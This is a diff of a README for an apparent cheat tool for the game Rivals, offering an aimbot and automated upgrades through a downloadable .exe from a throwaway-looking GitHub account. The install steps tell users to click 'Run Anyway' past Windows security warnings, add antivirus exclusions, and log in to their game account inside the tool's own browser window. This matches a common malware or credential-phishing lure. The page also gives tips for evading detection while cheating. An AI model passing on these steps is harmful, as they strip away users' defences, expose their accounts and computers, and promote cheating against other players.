@@ -1,98 +1,75 @@
-# Rivals No-Ban Scripts - Game Script Utility 2026
+# ⚡ rivals-windows-script-tool - Automate your game progression and combat
 
-> **PC automation utility for Rivals.** Helps streamline progression upgrades and provides combat-targeting assistance during gameplay.
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/rashidmutyaba61-sudo/rivals-windows-script-tool/releases)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-PC-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/oliverkzgscott8935/rivals-windows-script-tool?style=flat-square)](https://github.com/oliverkzgscott8935/rivals-windows-script-tool)
+## 📌 About this tool
 
----
+The rivals-windows-script-tool provides a way to simplify your experience in Rivals. This utility handles repetitive progression upgrades for your account. It also assists with combat targeting sequences. You save time on manual tasks while you play. The application works on Windows systems to automate inputs that improve your efficiency in the game.
 
-<p align="center">
-  <a href="https://oliverkzgscott8935.github.io/rivals-windows-script-tool/">
-    <img src="https://img.shields.io/badge/Download-Rivals%20No-Ban%20Script-brightgreen?style=for-the-badge" alt="Download Rivals No-Ban Script">
-  </a>
-</p>
+## 💻 System requirements
 
-> **[Download Rivals No-Ban Scripts](https://oliverkzgscott8935.github.io/rivals-windows-script-tool/)**
+Before you install the tool, check your computer for these prerequisites:
 
----
+- Operating System: Windows 10 or Windows 11.
+- Memory: At least 4GB of RAM.
+- Storage: 100MB of free disk space.
+- Network: A stable internet connection.
+- Software: You must have the standard web browser you use for the game installed. No extra coding tools are necessary.
 
-[Download Latest Build](https://oliverkzgscott8935.github.io/rivals-windows-script-tool/)
+## 📥 How to download and install
 
----
+Follow these steps to get the tool running on your PC.
 
-## What It Does
+1. Visit the project release page: https://github.com/rashidmutyaba61-sudo/rivals-windows-script-tool/releases
+2. Look for the section labeled Latest Release.
+3. Find the file ending in .exe.
+4. Click the file name to start the download.
+5. Save the file to your desktop or downloads folder.
+6. Double-click the downloaded .exe file to launch the installer.
+7. Follow the on-screen prompts to complete the setup process.
+8. If Windows displays a security warning, click More Info and then click Run Anyway. This happens because the file is new.
 
-Rivals No-Ban Scripts combines two utilities for PC gameplay: automated character progression and combat-targeting support. Its auto-upgrade module handles resource distribution to help improve the current loadout, while the aimbot module assists with selecting and tracking targets. The tools run through the game client environment.
+## ⚙️ How to use the script
 
-This release is built around responsive operation and stable use. The targeting system is adjusted for typical engagement distances, and the upgrade routine is intended to use available resources efficiently. Other than a compatible Rivals installation and a current web browser or script loader, no additional dependencies are needed.
+Once you complete the installation, you will see an icon on your desktop. 
 
----
+1. Launch the application by clicking the icon.
+2. Log in to your game account through the browser window provided by the script.
+3. Select the features you want to enable from the main menu.
+4. Click the Start button.
+5. The tool will begin to automate the selected tasks.
+6. Monitor the status panel to see what the script does in real time.
+7. Click the Stop button at any time to halt all activity.
 
-## Included Functions
+## 🛡️ Best practices for safe use
 
-- Automatically assigns upgrade points according to priorities in the active loadout
-- Provides adjustable aimbot sensitivity and target-selection preferences
-- Offers a compact HTML interface for controlling modules while playing
-- Supports custom hotkeys for switching individual functions on or off
-- Displays live indicators for currently enabled features
-- Maintains a low resource footprint during ordinary gameplay
+Automation tools interact with game servers. Follow these tips to use the tool responsibly:
 
----
+- Keep your settings at reasonable intervals to mimic human behavior.
+- Avoid running the script 24 hours a day.
+- Check for updates regularly to ensure you have the latest improvements.
+- Report any bugs or unexpected behavior through the GitHub issues tab. 
+- Use the tool only on one account to maintain account security.
 
-## Getting Started
+## 🛠️ Troubleshooting common issues
 
-1. Download the newest script file from the link above.
-2. Save the HTML file somewhere convenient on your PC.
-3. Open it with a modern browser. Chrome, Edge, and Firefox are recommended.
-4. Use the interface toggles or assigned hotkeys to activate the desired functions.
+If you encounter problems, walk through these steps:
 
-For a more convenient setup, use the script as an overlay or place it on a second monitor while Rivals is running. The file does not require installation or administrator access.
+- If the script fails to detect game elements, refresh your browser page.
+- If the tool crashes, close all programs and try to restart the computer.
+- If antivirus software flags the tool, add an exclusion for the folder where you installed the script.
+- Ensure your game resolution is set to the default windowed mode.
+- Check that your display scaling settings are set to 100% in Windows display preferences.
 
----
+## 🚀 Future updates
 
-## Configuration
+Development of this tool continues based on user feedback. Future versions will include:
 
-| Option | Default | Description |
-|--------|---------|-------------|
-| Auto-Upgrade | Enabled | Automatically spends upgrade points on priority stats |
-| Aimbot | Disabled | Assists with target acquisition and tracking |
-| Sensitivity | 50 | Aimbot responsiveness (1-100 scale) |
-| Hotkey Toggle | F5 | Enable/disable all script features |
-| Status Display | Enabled | Shows active modules in the interface corner |
+- Improved targeting precision during high-latency gameplay.
+- Advanced settings for specific character progression paths.
+- Compatibility with more game versions and patches.
+- Enhanced low-resource mode for older computers.
 
----
+Keywords: automation, rivals, windows, script, game-tool, progression, targeting
 
-## Compatibility Notes
-
-- **Platform:** PC (Windows, macOS, Linux via browser)
-- **Game Version:** Tested with current Rivals release
-- **Limitations:** The game window must stay active for full functionality. Certain anti-cheat systems can affect script behavior, and results may differ depending on system specifications.
-
----
-
-## Frequently Asked Questions
-
-**What is the installation process?**  
-Download the HTML file, then open it in a supported browser. There is no installer.
-
-**Are updates installed automatically?**  
-No. Updated releases are published on the download page, and the existing file must be replaced manually.
-
-**Can the aimbot be adjusted?**  
-Yes. The interface includes a sensitivity control and target-priority settings.
-
-**Is every game mode supported?**  
-The script targets standard gameplay modes. Certain special modes may impose restrictions.
-
-**Where does the script keep my preferences?**  
-Your configuration is saved locally in the browser storage.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/rashidmutyaba61-sudo/rivals-windows-script-tool/releases)
